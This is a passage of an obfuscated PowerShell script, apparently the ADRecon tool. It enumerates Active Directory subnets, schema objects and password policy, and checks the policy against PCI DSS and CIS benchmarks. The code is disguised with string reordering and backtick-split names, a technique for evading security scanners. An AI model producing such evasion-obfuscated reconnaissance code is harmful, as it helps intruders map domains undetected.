                ${o`BJ} | &("{0}{2}{1}"-f'Add-M','ber','em') -MemberType ("{0}{1}{2}{3}" -f'NoteP','r','o','perty') -Name ("{1}{0}"-f 'ame','N') -Value $([string] ${_}."PRopEr`Ti`Es"."N`Ame")
                ${O`BJ} | &("{1}{2}{0}"-f 'ber','Ad','d-Mem') -MemberType ("{2}{3}{0}{1}" -f 'ePropert','y','No','t') -Name ("{1}{2}{0}" -f 'on','Descript','i') -Value $([string] ${_}."PRO`PerTI`es"."D`eS`cRip`TIoN")
                ${o`BJ} | &("{0}{1}{2}" -f'A','dd-Mem','ber') -MemberType ("{2}{0}{1}{3}"-f 'Pr','op','Note','erty') -Name ("{2}{0}{1}" -f 'enCrea','ted','wh') -Value ([DateTime] $(${_}."p`ROpERTI`eS"."WH`EnCRe`At`ED"))
                ${O`Bj} | &("{2}{0}{1}"-f'd','-Member','Ad') -MemberType ("{3}{1}{0}{2}" -f 'e','teProp','rty','No') -Name ("{3}{1}{2}{0}" -f'anged','hen','Ch','w') -Value ([DateTime] $(${_}."Pr`Op`eRtIEs"."WhE`NchA`N`GEd"))
                ${a`DsIT`eOBJ} += ${o`Bj}
            }
            &("{0}{2}{1}" -f 'Remo','Variable','ve-') ("{0}{1}" -f 'A','DSites')
        }
    }

    If (${AD`sI`TEObJ})
    {
        Return ${AD`Si`TeObJ}
    }
    Else
    {
        Return ${Nu`LL}
    }
}

Function GEt-a`Drsu`B`N`et
{

    param(
        [Parameter(maNDatOrY = ${tR`UE})]
        [string] ${m`EtH`oD},

        [Parameter(MANDatOry = ${fAl`sE})]
        [DirectoryServices.DirectoryEntry] ${O`BJDo`Main},

        [Parameter(maNDaTorY = ${faL`SE})]
        [DirectoryServices.DirectoryEntry] ${oB`JDoMAINro`oT`DSE},

        [Parameter(mANdatoRY = ${F`A`lse})]
        [string] ${dO`mA`IncoNT`ROl`leR},

        [Parameter(MANdatORY = ${f`ALsE})]
        [Management.Automation.PSCredential] ${CRE`dEn`TiAL} =   (vARiABlE ("NK5"+"p")  ).vAlue::"eM`PTy"
    )

    If (${ME`TH`Od} -eq ("{0}{1}" -f'AD','WS'))
    {
        Try
        {
            ${SEAr`c`hP`AtH} = ("{2}{3}{1}{0}{4}"-f 'te','=Si','CN=Subnets,C','N','s')
            ${aD`s`Ubn`etS} = &("{1}{0}{2}" -f'O','Get-AD','bject') -SearchBase "$SearchPath,$((Get-ADRootDSE).configurationNamingContext)" -LDAPFilter (("{2}{5}{0}{3}{4}{1}" -f'C','et)','(objec','la','ss=subn','t')) -Properties ("{1}{0}"-f'e','Nam'),("{3}{0}{1}{2}"-f 'cr','ip','tion','Des'),("{0}{1}{2}"-f 'siteOb','je','ct'),("{0}{3}{2}{1}"-f'whe','d','ate','nCre'),("{0}{2}{1}"-f'wh','anged','enCh')
        }
        Catch
        {
            &("{0}{2}{1}"-f 'W','ing','rite-Warn') ("{4}{7}{5}{6}{2}{9}{0}{8}{1}{3}" -f 'le enum','ra','wh','ting Subnet Objects','[Get-','et] Erro','r ','ADRSubn','e','i')
            &("{0}{2}{3}{1}" -f 'Wri','Verbose','t','e-') "[EXCEPTION] $($_.Exception.Message) "
            Return ${nU`ll}
        }

        If (${Ads`U`BnE`TS})
        {
            &("{0}{2}{1}"-f'Write-','rbose','Ve') "[*] Total Subnets: $([ADRecon.ADWSClass]::ObjectCount($ADSubnets)) "
            
            ${A`d`Su`BneTobj} = @()
            ${Ads`UB`Ne`Ts} | &("{3}{0}{1}{2}"-f'rEach-Ob','jec','t','Fo') {
                
                ${o`BJ} = &("{1}{2}{0}" -f'ct','Ne','w-Obje') ("{0}{1}"-f'PSO','bject')
                ${O`BJ} | &("{0}{1}{2}"-f'Add-','Mem','ber') -MemberType ("{2}{3}{0}{1}"-f 'pert','y','N','otePro') -Name ("{1}{0}" -f'ite','S') -Value $((${_}."SItEo`BJ`Ect" -Split ",")[0] -replace 'CN=','')
                ${O`Bj} | &("{1}{3}{0}{2}" -f'em','Add-','ber','M') -MemberType ("{2}{3}{1}{0}" -f'ty','Proper','No','te') -Name ("{1}{0}"-f 'me','Na') -Value ${_}."n`Ame"
                ${O`Bj} | &("{0}{2}{1}"-f 'Ad','r','d-Membe') -MemberType ("{1}{0}{2}{3}" -f'rope','NoteP','r','ty') -Name ("{2}{1}{0}"-f'ription','sc','De') -Value ${_}."DeSC`RipTI`On"
                ${O`BJ} | &("{0}{2}{1}"-f 'Add','mber','-Me') -MemberType ("{2}{0}{1}" -f'ote','Property','N') -Name ("{0}{1}{2}"-f 'w','hen','Created') -Value ${_}."WH`Enc`R`EATEd"
                ${O`BJ} | &("{1}{0}{2}" -f 'd','Ad','-Member') -MemberType ("{2}{1}{0}" -f 'y','ert','NoteProp') -Name ("{0}{2}{1}"-f 'when','ed','Chang') -Value ${_}."whenC`H`ANGed"
                ${ADSUb`Ne`T`oBj} += ${O`BJ}
            }
            &("{1}{2}{4}{0}{3}" -f 'riabl','Re','move-','e','Va') ("{0}{1}{3}{2}" -f 'ADS','ub','s','net')
        }
    }

    If (${m`e`THOd} -eq ("{0}{1}"-f'LD','AP'))
    {
        ${sEA`R`ChpaTh} = ("{1}{3}{4}{5}{2}{0}"-f 'tes','C','=Si','N=','S','ubnets,CN')
        If (${C`REDeN`T`Ial} -ne  ( gcI  ("varI"+"AbLE"+":nK5"+"p")  ).vALuE::"E`mPTY")
        {
            ${Obj`SeA`R`ChP`Ath} = &("{2}{0}{1}" -f 'b','ject','New-O') ("{8}{5}{1}{0}{4}{3}{9}{6}{2}{7}"-f'.Di','em','oryEn','rvices.','rectorySe','st','t','try','Sy','Direc') "LDAP://$($DomainController)/$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)", ${cReD`E`NTIAl}."u`Sern`AMe",${cREDe`N`TIaL}.("{1}{2}{3}{0}{4}" -f'kCreden','Ge','t','Networ','tial').Invoke()."PAs`S`word"
        }
        Else
        {
            ${ObjSea`Rc`Hpa`Th} = &("{2}{0}{3}{1}" -f'bj','t','New-O','ec') ("{7}{3}{6}{4}{8}{2}{0}{5}{1}" -f'Services.Dir','try','ectory','s','.D','ectoryEn','tem','Sy','ir') "LDAP://$SearchPath,$($objDomainRootDSE.ConfigurationNamingContext)"
        }
        ${OB`jsEarCh`Er} = &("{1}{2}{0}"-f 'ject','New-O','b') ("{7}{5}{3}{0}{1}{6}{4}{2}" -f 'ire','ctoryServices.Dire','archer','.D','Se','ystem','ctory','S') ${OB`JsearcHP`ATh}
        ${OB`j`searCher}."fIL`TeR" = ("{0}{6}{3}{5}{2}{4}{1}"-f'(objec','t)','ubn','ass=','e','s','tCl')
        ${o`Bj`SearC`hEr}."se`ARch`SCOpe" = ("{0}{2}{1}" -f 'Subt','ee','r')

        Try
        {
            ${A`dS`UBnETs} = ${ob`J`SeA`RcHeR}.("{0}{1}"-f'F','indAll').Invoke()
        }
        Catch
        {
            &("{2}{3}{0}{1}" -f'arni','ng','Writ','e-W') ("{11}{0}{5}{9}{12}{15}{1}{4}{3}{10}{13}{2}{14}{8}{6}{7}"-f '-ADRSubnet]','ile',' S','umerat',' en',' ','et Obje','cts','n','Er','in','[Get','r','g','ub','or wh')
            &("{2}{3}{0}{1}{4}" -f'e-','Verb','Wri','t','ose') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`Ull}
        }
        ${OBjSeA`R`cher}.("{0}{1}{2}"-f'di','s','pose').Invoke()

        If (${Adsub`NE`TS})
        {
            &("{2}{1}{0}{4}{3}" -f 'rb','ite-Ve','Wr','e','os') "[*] Total Subnets: $([ADRecon.LDAPClass]::ObjectCount($ADSubnets)) "
            
            ${ADsuB`NEt`oBj} = @()
            ${A`d`SUbne`TS} | &("{2}{3}{1}{0}"-f 'ject','h-Ob','F','orEac') {
                
                ${O`Bj} = &("{2}{0}{1}"-f 'ew','-Object','N') ("{1}{0}" -f'ect','PSObj')
                ${O`BJ} | &("{0}{2}{1}" -f'Add-Me','r','mbe') -MemberType ("{1}{2}{0}" -f'ty','NotePr','oper') -Name ("{1}{0}"-f 'te','Si') -Value $((([string] ${_}."pROPE`R`Ti`eS"."SIt`EoBJE`ct") -Split ",")[0] -replace 'CN=','')
                ${O`BJ} | &("{1}{0}{2}" -f 'd','Ad','-Member') -MemberType ("{0}{2}{1}" -f 'Not','erty','eProp') -Name ("{0}{1}" -f 'N','ame') -Value $([string] ${_}."Pro`PE`Rties"."nA`me")
                ${O`BJ} | &("{1}{2}{0}" -f'Member','Add','-') -MemberType ("{0}{1}{2}" -f 'NotePrope','r','ty') -Name ("{2}{0}{1}" -f'ptio','n','Descri') -Value $([string] ${_}."PROpeR`T`iES"."dES`c`R`iptIOn")
                ${o`BJ} | &("{1}{2}{0}" -f 'er','Ad','d-Memb') -MemberType ("{0}{2}{1}{3}"-f'NotePr','ert','op','y') -Name ("{2}{1}{0}" -f'ted','rea','whenC') -Value ([DateTime] $(${_}."PRoPeRT`i`eS"."Wh`E`NCreaTeD"))
                ${O`Bj} | &("{2}{1}{0}" -f 'ember','-M','Add') -MemberType ("{0}{2}{1}" -f'Note','ty','Proper') -Name ("{0}{1}{2}{3}" -f'whenCha','ng','e','d') -Value ([DateTime] $(${_}."pr`Ope`RTiES"."whE`NCha`Ng`ed"))
                ${A`dsu`BNET`ObJ} += ${O`Bj}
            }
            &("{0}{4}{3}{1}{2}"-f'Remov','ari','able','V','e-') ("{0}{1}"-f'ADSubn','ets')
        }
    }

    If (${adSUbN`E`T`oBJ})
    {
        Return ${ad`Subn`EToBJ}
    }
    Else
    {
        Return ${nu`ll}
    }
}


Function GeT`-AD`R`sChEmahI`s`T`Ory
{

    param(
        [Parameter(mANDAtORy = ${Tr`Ue})]
        [string] ${M`eTh`oD},

        [Parameter(MANdatORy = ${f`ALse})]
        [DirectoryServices.DirectoryEntry] ${Obj`Do`mAiN},

        [Parameter(MaNDaTORY = ${fa`lSe})]
        [DirectoryServices.DirectoryEntry] ${OBJD`O`maINro`OTD`sE},

        [Parameter(MANdatOry = ${FA`lsE})]
        [string] ${do`MaINcOnTR`O`LL`ER},

        [Parameter(manDaToRy = ${F`Al`se})]
        [Management.Automation.PSCredential] ${cREd`EntI`Al} =  $NK5P::"eM`Pty"
    )

    If (${M`ET`hod} -eq ("{0}{1}" -f 'A','DWS'))
    {
        Try
        {
            ${AD`sch`em`AHiSTo`RY} = @( &("{0}{1}{2}" -f'Get-A','DObjec','t') -SearchBase ((&("{1}{2}{0}{3}"-f 'DRoo','G','et-A','tDSE'))."sC`HemaN`AminGco`NT`ExT") -SearchScope ("{0}{1}{2}"-f 'One','Le','vel') -Filter * -Property ("{3}{2}{1}{4}{0}"-f 'e','tinguished','s','Di','Nam'), ("{0}{1}" -f'Na','me'), ("{2}{0}{1}"-f 'bjectCla','ss','O'), ("{2}{1}{0}{3}"-f 'e','ng','whenCha','d'), ("{1}{2}{0}" -f'ted','w','henCrea') )
        }
        Catch
        {
            &("{1}{0}{3}{2}{4}" -f 'e-War','Writ','i','n','ng') ("{2}{3}{10}{9}{0}{12}{7}{6}{1}{4}{8}{11}{5}" -f'ory','ing Sc','[Ge','t-AD','hema ','ects','t','umera','Ob','chemaHist','RS','j','] Error while en')
            &("{1}{3}{2}{0}" -f 'e','Write-Ve','s','rbo') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULl}
        }

        If (${AD`sCH`EmA`HIstoRY})
        {
            &("{1}{0}{2}" -f'ite-Ve','Wr','rbose') "[*] Total Schema Objects: $([ADRecon.ADWSClass]::ObjectCount($ADSchemaHistory)) "
            ${aD`Sc`HE`maObj} =   (  Get-variAbLE  it3v9E ).vALUE::("{1}{2}{0}" -f'arser','S','chemaP').Invoke(${aDs`chemaHi`ST`Ory}, ${TH`R`eAds})
            &("{4}{0}{1}{2}{3}" -f'emo','v','e','-Variable','R') ("{4}{0}{2}{1}{3}"-f'hema','to','His','ry','ADSc')
        }
    }

    If (${Me`T`hoD} -eq ("{0}{1}"-f 'LD','AP'))
    {
        If (${c`REDeNTi`AL} -ne  ( DIR  vAriaBlE:nK5P  ).ValUE::"EMP`Ty")
        {
            ${o`B`Js`E`ARCHpath} = &("{0}{2}{1}{3}"-f 'N','O','ew-','bject') ("{7}{5}{3}{4}{0}{9}{1}{8}{6}{2}" -f'S','es','ry','e','m.Directory','yst','ectoryEnt','S','.Dir','ervic') "LDAP://$($DomainController)/$($objDomainRootDSE.schemaNamingContext)", ${c`R`eDentIAL}."usE`R`NaME",${cRe`dENt`IaL}.("{2}{0}{1}{4}{3}{5}" -f 'orkCred','en','GetNetw','a','ti','l').Invoke()."PaSs`wO`RD"
        }
        Else
        {
            ${O`BjseA`RchPA`TH} = &("{1}{2}{0}" -f'ect','New-O','bj') ("{4}{7}{0}{6}{3}{9}{2}{1}{8}{5}" -f 'Dire','r','.Di','t','Sys','ryEntry','c','tem.','ecto','oryServices') "LDAP://$($objDomainRootDSE.schemaNamingContext)"
        }
        ${oB`JSe`ArcH`eR} = &("{1}{2}{0}"-f '-Object','N','ew') ("{1}{4}{0}{3}{7}{8}{9}{10}{6}{5}{2}"-f'i','System.Dire','her','c','ctoryServ','rc','Sea','es.Dire','cto','r','y') ${OBjse`ARChP`A`TH}
        ${O`BJSE`ArCh`ER}."FiLT`er" = ("{0}{2}{1}{3}" -f'(','ect','obj','Class=*)')
        ${OB`jSea`RC`HEr}."pRO`pe`RTiES`To`loaD".("{2}{1}{0}"-f'e','g','AddRan').Invoke((("{1}{2}{0}{4}{3}" -f'ngu','d','isti','e','ishednam'),("{0}{1}"-f 'n','ame'),("{0}{1}{3}{2}" -f'object','c','s','las'),("{2}{3}{0}{1}" -f'han','ged','wh','enc'),("{2}{1}{3}{0}" -f'ated','enc','wh','re')))
        ${O`Bj`SeaRc`heR}."SE`ARChs`Cope" = ("{1}{0}{2}" -f'Leve','One','l')

        Try
        {
            ${adS`c`heMAHIStOry} = ${oB`jSeAR`c`her}.("{0}{1}{2}" -f 'F','ind','All').Invoke()
        }
        Catch
        {
            &("{2}{0}{1}" -f'te-','Warning','Wri') ("{3}{2}{10}{8}{4}{7}{13}{12}{5}{1}{11}{9}{6}{0}"-f 'ma Objects','mer','Get-ADRS','[','maHi','e enu',' Sche','s','e','g','ch','atin',' Error whil','tory]')
            &("{2}{1}{3}{0}" -f 'ose','e-Ve','Writ','rb') "[EXCEPTION] $($_.Exception.Message) "
            Return ${Nu`Ll}
        }
        ${Ob`jsE`ArcH`eR}.("{2}{1}{0}" -f'se','ispo','d').Invoke()

        If (${ad`S`cheM`AHi`stORy})
        {
            &("{3}{0}{2}{1}{4}"-f 'r','s','ite-Verbo','W','e') "[*] Total Schema Objects: $([ADRecon.LDAPClass]::ObjectCount($ADSchemaHistory)) "
            ${ADS`CHe`maObj} =   (  VARiAble  D761P).VAluE::("{3}{2}{0}{1}" -f 'aParse','r','m','Sche').Invoke(${ADscH`E`mAH`iS`To`Ry}, ${t`h`ReaDS})
            &("{1}{0}{2}"-f'e-Variabl','Remov','e') ("{3}{1}{2}{0}" -f'y','hema','Histor','ADSc')
        }
    }

    If (${a`DscheMao`BJ})
    {
        Return ${AdsChem`Ao`BJ}
    }
    Else
    {
        Return ${N`ULl}
    }
}

Function GET-a`D`R`dEFAUlTPaSswO`RDPoLIcY
{

    param(
        [Parameter(mANdaTOrY = ${TR`UE})]
        [string] ${m`et`hoD},

        [Parameter(manDatory = ${FAL`Se})]
        [DirectoryServices.DirectoryEntry] ${ObJ`DO`Ma`In}
    )

    If (${m`ETHOD} -eq ("{0}{1}"-f 'A','DWS'))
    {
        Try
        {
            ${aD`p`AsSpolicy} = &("{8}{0}{1}{4}{3}{5}{2}{7}{6}"-f 't-ADDe','f','o','ltDomainPa','au','ssw','cy','rdPoli','Ge')
        }
        Catch
        {
            &("{1}{4}{0}{3}{2}"-f'e','Wri','arning','-W','t') ("{0}{8}{12}{3}{5}{13}{6}{15}{16}{7}{10}{9}{14}{11}{4}{1}{2}"-f '[G','P','olicy','tPassword',' ','Po','icy] Er','e enumerating t','et','fault Pass','he De','ord','-ADRDefaul','l','w','ror',' whil')
            &("{0}{1}{3}{2}{4}"-f'Wri','te-Verb','s','o','e') "[EXCEPTION] $($_.Exception.Message) "
            Return ${n`ULl}
        }

        If (${ADp`ASS`poL`I`Cy})
        {
            ${ObjvAl`U`es} = @( (("{8}{6}{3}{0}{7}{1}{9}{5}{10}{4}{2}"-f's','ord','s)','as','ord','s','rce p','w','Enfo',' history (pas','w')), ${a`dP`ASSpo`LiCy}."PA`S`SW`oRDhIstOr`yCOunT", "4", ("{2}{1}{0}" -f'2.5',' 8.','Req.'), "8", ("{1}{0}{2}"-f 'ol','Contr',': 0423'), ("{1}{2}{3}{0}"-f 'e','24',' ','or mor'),
            (("{5}{2}{4}{7}{0}{3}{8}{1}{6}"-f ' a','d','pas','ge ','swor','Maximum ','ays)','d','(')), ${Adp`As`SpO`LiCy}."maXP`ASSW`OrDagE"."d`AYS", "90", ("{0}{1}{2}{3}" -f 'Req','. 8.','2','.4'), "90", ("{2}{0}{4}{3}{1}" -f'o','23','C','4','ntrol: 0'), ("{1}{0}{2}" -f 'o ','1 t','60'),
            (("{1}{2}{4}{3}{0}"-f 'ays)','Minim','u',' (d','m password age')), ${aDpAsS`PoLi`cY}."mi`Np`As`swoRdagE"."d`Ays", "N/A", "-", "1", ("{2}{3}{0}{1}" -f ': 0','423','Cont','rol'), ("{2}{0}{1}" -f'r mor','e','1 o'),
            ("{7}{0}{2}{8}{4}{6}{5}{1}{3}{9}"-f 'm','h (c','um p','harac','sswor','engt','d l','Mini','a','ters)'), ${ADpAsspOL`i`Cy}."Mi`NPAsSWo`Rd`L`e`NGtH", "7", ("{1}{2}{0}" -f '3','R','eq. 8.2.'), "13", ("{2}{0}{1}{3}"-f'rol: 0','4','Cont','21'), ("{2}{0}{1}"-f' m','ore','14 or'),
            ("{1}{0}{4}{6}{5}{3}{2}" -f 'st meet ','Password mu','xity requirements','e','co','pl','m'), ${ad`PA`SSpOLiCy}."cO`MPlEX`ItYEN`AbL`ed", ${t`RUe}, ("{1}{2}{0}"-f '.3','Req. 8','.2'), ${t`RuE}, ("{3}{1}{0}{4}{2}" -f'ntrol','o','0421','C',': '), ${TR`UE},
            ("{6}{4}{3}{7}{15}{13}{9}{0}{14}{10}{12}{11}{5}{8}{1}{2}" -f'n','in the d','omain','ng r','ore password usi',' u','St','e','sers ',' e','yption','for all',' ','le','cr','versib'), ${AD`pAs`spOLICy}."RE`V`ErsibLeen`c`RYPtIO`NenA`BleD", "N/A", "-", "N/A", "-", ${f`AlSe},
            (("{5}{1}{2}{6}{3}{4}{0}"-f's)','t lo','c','duration',' (min','Accoun','kout ')), ${ad`P`AssPO`lIcY}."lock`Ou`TdurA`T`iON"."minu`TEs", ("{1}{0}{3}{2}"-f' (manual','0','ock) or 30',' unl'), ("{2}{1}{0}"-f '8.1.7','q. ','Re'), "N/A", "-", ("{0}{1}{2}"-f '15 or',' m','ore'),
            ("{1}{4}{5}{2}{3}{0}{6}" -f 'ld (','Account ','thres','ho','l','ockout ','attempts)'), ${adPA`SSPOLi`CY}."lOC`k`oUTTHres`ho`lD", ("{1}{0}{2}" -f 'to','1 ',' 6'), ("{2}{0}{3}{1}"-f 'e','.6','R','q. 8.1'), ("{0}{1}{2}"-f'1',' ','to 5'), ("{2}{1}{0}{3}{4}"-f 'o','ntr','Co','l:',' 1403'), ("{1}{0}"-f 'to 10','1 '),
            ("{0}{4}{7}{8}{1}{9}{2}{12}{5}{6}{10}{3}{11}" -f'Rese','lock','n','i','t a','er a','fter (','c','count ','out cou','m','ns)','t'), ${A`DpAsS`PoLIcy}."LOCkO`Uto`B`SErVA`TIO`NwINd`oW"."MI`NuT`eS", "N/A", "-", "N/A", "-", ("{0}{3}{1}{2}"-f'1','mo','re','5 or ') )

            &("{3}{4}{0}{2}{1}"-f'ari','ble','a','Rem','ove-V') ("{1}{2}{3}{0}" -f'olicy','AD','pa','ssp')
        }
    }

    If (${met`HOD} -eq ("{0}{1}" -f'L','DAP'))
    {
        If (${oBJd`OmA`IN})
        {
            
            ${p`wd`p`ROPER`TieS} = @{
                ("{0}{3}{4}{1}{2}"-f'DOMAI','COMPL','EX','N_PAS','SWORD_') = 1;
                ("{0}{8}{3}{7}{5}{4}{1}{6}{2}" -f 'DO','CH','NGE','N_PA','N_','RD_NO_ANO','A','SSWO','MAI') = 2;
                ("{4}{5}{3}{2}{0}{1}"-f 'AR','_CHANGE','CLE','RD_NO_','DOMAI','N_PASSWO') = 4;
                ("{4}{2}{1}{6}{0}{3}{5}"-f'CKOUT_A','N_L','I','DMI','DOMA','NS','O') = 8;
                ("{3}{6}{1}{2}{7}{5}{0}{4}" -f'CLEA','MAIN_PAS','SW','D','RTEXT','RD_STORE_','O','O') = 16;
                ("{7}{1}{2}{5}{6}{3}{4}{0}"-f'HANGE','_RE','FU','ASSWO','RD_C','SE','_P','DOMAIN') = 32
            }

            If ((${Ob`jd`oMAin}."P`wdp`RO`pER`TIES"."VA`LUE" -band ${pwd`p`Rop`ERTi`es}[("{1}{4}{2}{3}{5}{0}" -f'PLEX','D','SW','ORD','OMAIN_PAS','_COM')]) -eq ${pwdp`Ro`per`T`iEs}[("{0}{2}{5}{4}{1}{3}" -f 'DOMAI','D','N_PA','_COMPLEX','OR','SSW')])
            {
                ${compLExPA`S`s`WORds} = ${t`RuE}
            }
            Else
            {
                ${C`o`Mp`lexp`AsSWOR`Ds} = ${f`A`Lse}
            }

            If ((${o`BJ`dOMA`iN}."pWDpROpeR`T`I`Es"."vA`Lue" -band ${p`wdpRopEr`TIeS}[("{2}{0}{3}{5}{4}{6}{1}{7}"-f'OM','_CLEARTE','D','AIN_PASS','ORD_STOR','W','E','XT')]) -eq ${PwdPr`operTi`ES}[("{7}{6}{4}{3}{1}{2}{0}{5}" -f 'E','STORE','_CLEART','WORD_','PASS','XT','N_','DOMAI')])
            {
                ${rEVE`RSiB`L`eE`NcrY`pTi`ON} = ${t`RUe}
            }
            Else
            {
                ${r`ev`ERsiBlEEnc`Ryp`T`ioN} = ${F`AlsE}
            }

            ${LOcKO`U`T`DuR`ATion} = $(${oBj`d`o`mAiN}.("{3}{4}{5}{6}{1}{2}{0}{7}" -f 't','eger','ToIn','Co','n','vertLargeI','nt','64').Invoke(${obj`d`omAIN}."lOCKo`Ut`DuRAti`On"."vA`LUE")/-600000000)

            If (${LoCK`ou`TD`UraT`ION} -gt 99999)
            {
                ${locKOu`TduRa`T`ioN} = 0
            }

            ${OBJ`V`A`LUES} = @( ("{8}{4}{9}{2}{3}{6}{5}{1}{0}{7}"-f 's','(pas','s','word hi','r',' ','story','words)','Enfo','ce pas'), ${o`Bj`DomAIn}."pwdhIsTORyLeN`G`Th"."v`ALuE", "4", ("{0}{1}{2}" -f'Req. 8.','2.','5'), "8", ("{1}{2}{0}"-f'l: 0423','Co','ntro'), ("{0}{1}{2}" -f '24 or ','mor','e'),
            (("{7}{6}{4}{0}{8}{3}{2}{5}{1}"-f'w','s)','e (d','rd ag',' pass','ay','m','Maximu','o')), $(${oBJ`Do`mAIn}.("{4}{0}{1}{2}{3}" -f 'g','eInte','gerToInt','64','ConvertLar').Invoke(${O`B`JDo`maIn}."Ma`XpWda`gE"."Va`lue") /-864000000000), "90", ("{0}{1}{2}"-f 'Req. ','8','.2.4'), "90", ("{1}{0}{2}" -f 'on','C','trol: 0423'), ("{2}{0}{1}"-f 't','o 60','1 '),
            (("{4}{3}{2}{1}{6}{5}{0}" -f ')',' (','d age','swor','Minimum pas','s','day')), $(${Ob`jd`omAiN}.("{7}{5}{4}{1}{8}{0}{3}{6}{2}"-f'e','rgeIn','4','rToInt','nvertLa','o','6','C','teg').Invoke(${o`BJdO`mAiN}."MiNPw`dA`ge"."va`lUe") /-864000000000), "N/A", "-", "1", ("{0}{1}{2}"-f 'Cont','ro','l: 0423'), ("{0}{2}{1}"-f '1 o',' more','r'),
            ("{5}{0}{7}{2}{4}{6}{3}{9}{1}{8}" -f 'ssword ','ers','th','ara',' (c','Minimum pa','h','leng',')','ct'), ${ObJD`Om`AIn}."m`INpWdl`EnG`Th"."v`ALUe", "7", ("{2}{0}{1}" -f'eq. 8.2','.3','R'), "13", ("{2}{1}{0}"-f 'l: 0421','o','Contr'), ("{0}{2}{1}" -f '1','re','4 or mo'),
            ("{0}{11}{5}{6}{7}{10}{2}{9}{3}{4}{8}{1}"-f 'Pass','ts','lexi','requi','rem','ord must mee','t ','com','en','ty ','p','w'), ${COmpLEx`pAs`s`words}, ${Tr`Ue}, ("{1}{0}{2}" -f'eq. ','R','8.2.3'), ${tR`UE}, ("{0}{2}{1}"-f 'Control:','21',' 04'), ${TR`Ue},
            ("{6}{9}{2}{15}{14}{8}{10}{7}{11}{12}{1}{13}{0}{4}{5}{3}" -f 'er',' for al',' pas','in','s in the d','oma','St','versible encry','rd using r','ore','e','ptio','n','l us','o','sw'), ${rE`VeR`sIbl`E`E`NcRyPtioN}, "N/A", "-", "N/A", "-", ${fa`LSE},
            ("{4}{6}{3}{2}{5}{1}{0}{7}" -f 'ation (m','ut dur','o','l','A','cko','ccount ','ins)'), ${lo`ckou`T`duRat`Ion}, ("{4}{7}{0}{3}{2}{5}{6}{1}" -f 'l u','30','l','n','0 (','oc','k) or ','manua'), ("{1}{0}{2}" -f'q','Re','. 8.1.7'), "N/A", "-", ("{0}{2}{1}"-f'15 or ','ore','m'),
            ("{1}{2}{8}{5}{6}{10}{0}{3}{4}{7}{9}" -f 'd ','Acc','ou','(a','tte',' ','th','mpts','nt lockout',')','reshol'), ${oBJd`oM`A`in}."LockoUTTHr`eSH`o`Ld"."V`ALue", ("{0}{1}"-f'1 to',' 6'), ("{2}{1}{0}" -f '6','1.','Req. 8.'), ("{1}{2}{0}"-f '5','1',' to '), ("{1}{2}{0}" -f ' 1403','Contro','l:'), ("{2}{1}{0}" -f '10','o ','1 t'),
            (("{5}{0}{2}{1}{6}{4}{7}{3}" -f't co','nter ','u','s)','fter (mi','Reset account lockou','a','n')), $(${objd`OM`Ain}.("{6}{1}{2}{5}{0}{4}{3}"-f'LargeInte','onve','r','Int64','gerTo','t','C').Invoke(${oBj`Do`MAin}."lO`CK`ouT`O`Bs`eRvATiONwI`N`DoW"."va`LUe")/-600000000), "N/A", "-", "N/A", "-", ("{0}{1}{2}"-f'15',' ','or more') )

            &("{0}{3}{1}{4}{2}" -f 'Re','ve-V','e','mo','ariabl') ("{1}{3}{0}{4}{2}" -f 'ro','pw','ties','dP','per')
            &("{1}{0}{2}"-f 'ove-Variabl','Rem','e') ("{3}{4}{0}{1}{2}"-f'r','d','s','Com','plexPasswo')
            &("{1}{0}{2}"-f've-Varia','Remo','ble') ("{1}{2}{0}{3}{4}" -f'ibleEncryp','Rev','ers','tio','n')
        }
    }

    If (${o`BJVa`lUeS})
    {
        ${AD`P`ASSPOL`ObJ} = @()
        For (${i} = 0; ${I} -lt $(${oB`Jv`A`lUeS}."coU`Nt"); ${i}++)
        {
            ${O`Bj} = &("{2}{1}{0}"-f'Object','ew-','N') ("{1}{2}{0}"-f't','PSO','bjec')
            ${O`BJ} | &("{0}{2}{1}"-f 'Ad','er','d-Memb') -MemberType ("{0}{3}{1}{2}" -f'Not','t','y','eProper') -Name ("{0}{1}"-f'Polic','y') -Value ${obJ`V`ALU`ES}[${i}]
            ${O`BJ} | &("{1}{0}{3}{2}"-f'-','Add','ber','Mem') -MemberType ("{2}{1}{0}"-f'operty','otePr','N') -Name ("{2}{0}{1}"-f 'urrent Va','lue','C') -Value ${ObjVa`lU`eS}[${i}+1]
            ${o`BJ} | &("{0}{1}{2}" -f'A','dd-Membe','r') -MemberType ("{1}{0}{3}{2}"-f'P','Note','operty','r') -Name ("{1}{2}{4}{0}{3}{5}"-f 'ire','P','CI ','me','DSS Requ','nt') -Value ${oBj`VALu`ES}[${I}+2]
            ${o`Bj} | &("{0}{2}{1}"-f 'Add-Mem','r','be') -MemberType ("{0}{1}{2}{3}" -f'No','t','eProp','erty') -Name ("{1}{2}{4}{0}{3}" -f'DSS ','P','C','v3.2.1','I ') -Value ${O`B`JV`ALUES}[${i}+3]
            ${O`BJ} | &("{0}{2}{1}"-f 'Add-M','er','emb') -MemberType ("{3}{0}{2}{1}"-f'otePro','y','pert','N') -Name ("{0}{1}"-f'AS','D ISM') -Value ${O`BJVA`lUes}[${I}+4]
            ${O`Bj} | &("{0}{2}{1}" -f 'Add-Me','ber','m') -MemberType ("{1}{2}{0}"-f 'ty','NoteP','roper') -Name ("{3}{1}{0}{2}" -f 'SM C','18 I','ontrols','20') -Value ${OB`JVaLu`ES}[${i}+5]
            ${O`Bj} | &("{2}{0}{1}{3}" -f 'dd-Me','mb','A','er') -MemberType ("{3}{2}{0}{1}"-f 'rt','y','rope','NoteP') -Name ("{0}{3}{1}{2}"-f 'CIS Ben','rk 20','16','chma') -Value ${oBJV`AlU`Es}[${i}+6]
            ${I} += 6
            ${a`dpA`S`SPOlOBj} += ${o`BJ}
        }
        &("{2}{3}{4}{0}{1}" -f '-Vari','able','Re','m','ove') ("{1}{0}{2}"-f 'jVa','Ob','lues')
        Return ${adPa`SSpOl`oBJ}
    }
    Else
    {
        Return ${nu`LL}
    }
}

Function gET-adR`FiNEGr`AineDPas`S`wOR`dp`O`lICY
{

    param(
        [Parameter(maNdaTory = ${tR`UE})]
        [string] ${MeTH`Od},

        [Parameter(manDaToRY = ${fAL`SE})]
        [DirectoryServices.DirectoryEntry] ${oBj`do`MA`in}
    )

    If (${me`TH`Od} -eq ("{0}{1}" -f 'ADW','S'))
    {
        Try
        {
